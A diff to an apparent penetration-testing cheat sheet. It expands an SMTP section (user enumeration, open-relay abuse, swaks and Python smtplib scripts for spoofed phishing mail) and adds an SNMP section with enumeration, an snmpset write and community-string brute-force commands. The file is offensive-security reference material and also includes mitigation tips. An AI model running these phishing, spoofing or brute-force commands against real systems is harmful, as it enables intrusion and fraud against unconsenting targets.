@@ -346,35 +346,136 @@ Result: Got the SSH shell
 <details>
  <summary>3. SMTP (Simple Mail Transfer Protocol) port 25</summary>
  <br>
-SMTP is used for sending and receiving emails. It can be exploited in cases of misconfiguration, such as **open relay** or **user enumeration**.
+What is SMTP?
+SMTP is the Simple Mail Transfer Protocol used to send emails between mail servers. It typically listens on port 25, though ports 587 (submission) and 465 (SMTPS) are also common.
 
-**Enumerating SMTP:**
+Misconfigurations in SMTP servers—such as open relays, authentication bypass, or exposed user verification commands (VRFY/EXPN)—can be exploited to enumerate users, send spoofed phishing emails, or relay attacks.
 
-```bash
-nc -nv <IP> 25 #Version Detection
-smtp-user-enum -M VRFY -U username.txt -t <IP> # -M means mode; it can be RCPT, VRFY, EXPN
+🔎 ENUMERATING SMTP
+🧪 Manual Banner Grabbing
+bash
 
-#Sending email with valid credentials, the below is an example of Phishing mail attack
-sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
+    nc -nv <IP> 25
+Useful commands in the SMTP session:
 
-```
+smtp
 
-This can be used to find valid email addresses on the target system.
+    EHLO attacker.com
+    VRFY root
+    EXPN admin
+    RCPT TO:test@target.com
+Common responses:
 
-**Exploiting Open Relay (sending emails):**
+250 OK → valid
+550 User unknown → invalid
+252 Cannot VRFY user → unverified (could be valid)
 
-```bash
+🛠 Tools for User Enumeration
+✅ smtp-user-enum
+Supports VRFY, RCPT, and EXPN modes.
 
-telnet <IP> 25
-HELO attacker.com
-MAIL FROM: attacker@attacker.com
-RCPT TO: victim@victim.com
-DATA
-Subject: Test
-This is a test email.
-.
+bash
 
-```
+    smtp-user-enum -M VRFY -U users.txt -t <IP>
+Other modes:
+
+-M RCPT (works even if VRFY is disabled)
+-M EXPN (useful if aliases/mailing lists are configured)
+
+✅ Metasploit
+bash
+
+    use auxiliary/scanner/smtp/smtp_enum
+    set RHOSTS <IP>
+    set RPORT 25
+    set USER_FILE users.txt
+    run
+✅ iSMTP (Kali Tool)
+Test for enumeration, spoofing, and relay support.
+
+bash
+
+    ismtp -h <IP>:25 -e email_list.txt
+✅ nmap Script
+bash
+
+    nmap -p 25 --script smtp-enum-users <IP>
+💣 Exploiting Open Relay
+An Open Relay allows unauthenticated users to send mail to external domains—ideal for phishing or spamming.
+
+✅ Manual via Telnet
+bash
+
+    telnet <IP> 25
+    HELO attacker.com
+    MAIL FROM: attacker@attacker.com
+    RCPT TO: victim@externaldomain.com
+    DATA
+    Subject: Test Message
+
+    This is a test message.
+    .
+If 250 OK is received after RCPT TO, the server is likely an open relay.
+
+✅ Nmap Open Relay Check
+bash
+
+    nmap -p 25 --script smtp-open-relay <IP>
+📤 Sending Emails (Phishing / Spoofing)
+✅ Using swaks
+swaks is a powerful SMTP tester and spam/phish simulation tool.
+
+bash
+
+    swaks --to victim@target.com --from admin@target.com --server <IP> \--header "Subject: Update Required" --body @body.txt \--attach @file.pdf --auth LOGIN --auth-user attacker --auth-password password
+Also works without auth on open relays:
+
+bash
+
+    swaks --to victim@target.com --from ceo@target.com --server <IP> --data "Subject: Urgent Action\nClick here"
+🛠 ALTERNATIVE TOOLS
+Tool	Purpose
+smtp-user-enum	Bruteforce usernames via SMTP responses
+swaks	Send test/phishing emails via SMTP
+nmap smtp- scripts*	Banner grabbing, enum, relay checks
+Metasploit smtp_enum	VRFY/EXPN-based user brute-force
+iSMTP	Enumeration and spoofing test
+smtp-cli	Lightweight mail-sender (can spoof headers)
+Python + smtplib	Custom phishing or payload delivery scripts
+
+🧪 Python Script Example (Spoofed Email)
+python
+
+    import smtplib
+    from email.message import EmailMessage
+
+    msg = EmailMessage()
+    msg.set_content("This is a phishing test.")
+    msg['Subject'] = 'Urgent Action Required'
+    msg['From'] = 'admin@company.com'
+    msg['To'] = 'victim@company.com'
+
+    server = smtplib.SMTP('<IP>', 25)
+    server.send_message(msg)
+    server.quit()
+🛡️ Mitigation Tips
+❌ Disable VRFY and EXPN commands (or return generic error like 252)
+
+❌ Disable open relay (ensure relay is restricted to known internal IPs)
+
+✅ Use SMTP AUTH and TLS for submission
+
+✅ Monitor SMTP logs for brute-force attempts or external relays
+
+✅ Apply SPF, DKIM, and DMARC to prevent spoofing
+
+📚 Real-World Use Cases
+🎣 Phishing Campaigns – Sending fake internal alerts or staged payloads
+
+🕵️ Internal Recon – Validating usernames before brute-forcing SMB/WinRM
+
+🧠 Password Spray – Combining usernames from SMTP enumeration in other protocols (SMB, HTTP, WinRM, etc.)
+
 </details>
 
 <details>
@@ -1489,4 +1590,138 @@ pywinrm	Python-based WinRM library
 Metasploit	Brute-force, auth check
 
 </details>
+ <details>
+<summary>15. SNMP  UDP-161</summary>
+ <br> 
+What is SNMP?
+Simple Network Management Protocol (SNMP) is used to manage and monitor networked devices (routers, switches, printers, servers, etc.). It typically runs over UDP port 161 for general communication and UDP port 162 for traps.
+
+Devices expose information using MIBs (Management Information Base).
+
+SNMP is stateless and supports versions v1, v2c, and v3:
+
+v1/v2c are widely used but insecure (community strings are in plaintext).
+
+v3 adds encryption and authentication.
+
+🧭 Enumeration Techniques
+1. Port Scanning
+bash
+
+       nmap -sU -p 161,162 <target-ip>
+-sU: Scan UDP ports
+-p: Specify SNMP ports (161 for queries, 162 for traps)
+
+2. snmpwalk
+bash
+
+       snmpwalk -v1 -c public <target-ip>
+Use -v2c or -v3 as needed.
+
+Common community strings: public, private, manager.
+
+Useful OIDs:
+1.3.6.1.2.1.1.5.0 – Hostname
+
+1.3.6.1.2.1.25.1.6.0 – System processes
+
+1.3.6.1.2.1.25.4.2.1.2 – Running processes
+
+1.3.6.1.4.1 – Vendor-specific MIBs
+
+3. snmpset (Active interaction)
+bash
+
+       snmpset -v1 -c private <target-ip> iso.3.6.1.2.1.1.5.0 s "hacked"
+Requires write access (via private community string).
+
+4. Dump Output to File
+bash
+
+       snmpwalk -v1 -c public <target-ip> > snmpout.txt
+gedit snmpout.txt
+5. SNMP-check
+bash
+
+     snmp-check -p 161 -c public <target-ip>
+Provides a human-readable summary of SNMP results.
+
+6. Braa (High-speed SNMP scanner)
+bash
+
+       braa public@<target-ip>:.1.3.6.*
+Mass SNMP scanning tool, lightweight, does not rely on Net-SNMP libs.
+
+🧨 Exploitation & Brute Force
+7. Metasploit - snmp_enum
+bash
+
+    use auxiliary/scanner/snmp/snmp_enum
+    set RHOSTS <target-ip>
+    set community public
+    run
+8. Hydra
+bash
+
+       hydra -P pass.txt <target-ip> snmp
+-P: Password list (community strings)
+
+9. Metasploit - snmp_login
+bash
+
+       use auxiliary/scanner/snmp/snmp_login
+       set RHOSTS <target-ip>
+       set PASS_FILE pass.txt
+       run
+10. Medusa
+bash
+
+        medusa -h <target-ip> -P pass.txt -M snmp
+11. Patator
+bash
+
+        patator SNMP_login host=<target-ip> community=FILE0 0=pass.txt
+12. Nmap NSE Script
+bash
+
+        nmap -sU -p 161 <target-ip> --script snmp-brute --script-args snmp-brute.communitiesdb=pass.txt
+13. Onesixtyone
+bash
+
+        onesixtyone -c pass.txt <target-ip>
+Simple and efficient brute-force tool.
+
+🧾 Useful Resources
+Common SNMP Community Strings Wordlist:
+fuzzdb SNMP wordlist[https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/wordlists-misc/wordlist-common-snmp-community-strings.txt]
+
+Extended MIB Enumeration:
+Explore additional SNMP fields via extended MIBs
+NET-SNMP-EXTEND-MIB[https://circitor.fr/]
+
+🛠️ Tips for Red Teamers & Pentesters
+SNMP Read-Only (RO) can leak:
+
+Usernames and services
+
+System details
+
+Running processes
+
+Network interfaces
+
+Potential credentials (sometimes encoded or plaintext)
+
+SNMP Read-Write (RW) access is highly critical:
+
+Can change configurations
+
+Reboot devices
+
+Inject malicious configuration (e.g., redirect logs, change SNMP traps)
+
+Use snmp-check and braa for fast reconnaissance, then deep dive with snmpwalk or Metasploit.
+
+SNMP often reveals network topology and firewall rules via MIBs.
   
+ </details>
